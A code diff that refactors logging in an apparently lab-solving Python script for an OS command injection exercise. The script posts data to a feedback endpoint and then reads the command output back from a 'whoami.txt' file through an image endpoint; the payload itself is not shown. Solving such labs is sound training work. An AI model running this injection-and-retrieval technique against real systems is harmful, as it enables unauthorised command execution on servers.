@@ -1,4 +1,4 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
 from bs4 import BeautifulSoup
 from urllib.parse import urlencode
 
@@ -16,25 +16,26 @@ def solve_lab(session):
     }
 
     path = "/feedback/submit"
-    print_info(
+    logger.info(
         f'Performing an OS command injection attack by sending a POST request to "{path}" with the following data:'
     )
     print(f"{data}")
 
     resp = session.post_path(path, data=data)
     if resp.status_code != 200:
-        print_fail("POST request not sent successfully.")
+        logger.failure("POST request not sent successfully.")
+        return
     else:
-        print_success("POST request sent successfully.\n")
+        logger.success("POST request sent successfully.")
 
     path = "/image"
     params = {"filename": "whoami.txt"}
-    print_info(
+    logger.info(
         f'Visiting "{path}?{urlencode(params)}" to retrieve the output of the command...'
     )
 
     resp = session.get_path(path, params=params)
     if resp.status_code != 200:
-        print_fail(resp.text)
+        logger.failure(resp.text.strip())
     else:
-        print_success(resp.text)
+        logger.success(resp.text.strip())
